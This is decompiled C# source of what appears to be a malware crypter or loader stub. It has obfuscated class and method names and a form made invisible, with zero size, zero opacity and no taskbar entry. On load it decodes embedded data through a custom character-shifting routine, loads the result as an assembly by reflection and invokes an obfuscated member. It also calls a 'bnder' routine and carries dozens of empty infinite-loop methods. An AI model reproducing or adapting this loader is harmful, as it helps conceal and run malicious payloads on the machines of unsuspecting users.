using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

public class aUmjGcBHDOS : Form
{
	public delegate object MyyaivXqWuM();

	public delegate byte[] YMKEWTpZkqm(string data);

	public delegate object xPQlmwUBeta();

	public delegate object hzIxdYZXcOH(object S);

	public delegate OpCode OsTFUYbSrUz(string s);

	public delegate object jfUoeVjtccP(object s);

	public delegate object CcyMaIZLPod(object s, object w, object o);

	public static bool BND = false;

	public static int ttlcnt = 0;

	public static bool firstpass = true;

	public static int procCount = 0;

	public static byte[] byte_0;

	public static byte[] byte_1;

	public static byte[] B59;

	public StringBuilder sbsource;

	private string string_0;

	private static string string_1 = "2";

	public static string roPP = "0";

	public static int cID;

	public static object object_0;

	internal static YMKEWTpZkqm D = (YMKEWTpZkqm)ALwj();

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new aUmjGcBHDOS());
	}

	public aUmjGcBHDOS()
	{
		((Form)this).add_Load((EventHandler)aUmjGcBHDOS_Load);
		sbsource = new StringBuilder();
		string_0 = "MI";
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Width(0);
		((Control)this).set_Height(0);
	}

	private void aUmjGcBHDOS_Load(object sender, EventArgs e)
	{
		Areal();
		object obj = IszHXyxOEGx.smethod_0(Conversions.ToString(LhDcUQbsIdR.smethod_0()), "wRHxMWFF");
		byte_1 = (byte[])smethod_1(Conversions.ToString(obj));
		smethod_2(B59, new object[2] { byte_0, byte_1 }, "Ò比勒やよぃき", "比提É开维ん");
		OqvJUoCpbDZ.bnder();
		if (!BND)
		{
			try
			{
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		ProjectData.EndApp();
	}

	private static void bndR9()
	{
	}

	private static void Areal()
	{
		B59 = (byte[])smethod_1(IszHXyxOEGx.smethod_0(Conversions.ToString(IszHXyxOEGx.smethod_2()), "2"));
		byte_0 = (byte[])smethod_1(smethod_3(RuntimeHelpers.GetObjectValue(rLTIojjinYR.smethod_0()), string_1));
	}

	public static void smethod_0()
	{
	}

	private static object ALwj()
	{
		return (YMKEWTpZkqm)olUhHHiqDfy.Rnanw9();
	}

	public static object smethod_1(string string_2)
	{
		return D(string_2);
	}

	public static object smethod_2(byte[] byte_2, object[] object_1, string string_2, string string_3)
	{
		return olUhHHiqDfy.smethod_1(byte_2).InvokeMember("比提É开维ん", BindingFlags.InvokeMethod, null, null, object_1);
	}

	public static string smethod_3(object object_1, object object_2)
	{
		object objectValue = RuntimeHelpers.GetObjectValue(MwELbDCSIKC.GSZ(RuntimeHelpers.GetObjectValue(object_1)));
		CcyMaIZLPod ccyMaIZLPod = OqvJUoCpbDZ.Nukk1;
		StringBuilder stringBuilder = new StringBuilder();
		StringBuilder stringBuilder2 = new StringBuilder();
		stringBuilder2.Append(Conversions.ToString(object_1));
		int num = Conversions.ToInteger(objectValue);
		for (int i = 0; i <= num; i = checked(i + 1))
		{
			object objectValue2 = RuntimeHelpers.GetObjectValue(ccyMaIZLPod(stringBuilder2[i], Conversions.ToString(object_2), 14));
			char value = IszHXyxOEGx.carSrDwPyVF_0(Conversions.ToInteger(objectValue2));
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	private static object apndta(object s)
	{
		return s;
	}

	static void smethod_4()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_5()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_6()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_7()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_8()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_9()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_10()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_11()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_12()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_13()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_14()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_15()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_16()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_17()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_18()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_19()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_20()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_21()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_22()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_23()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_24()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_25()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_26()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_27()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_28()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void smethod_29()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}
}
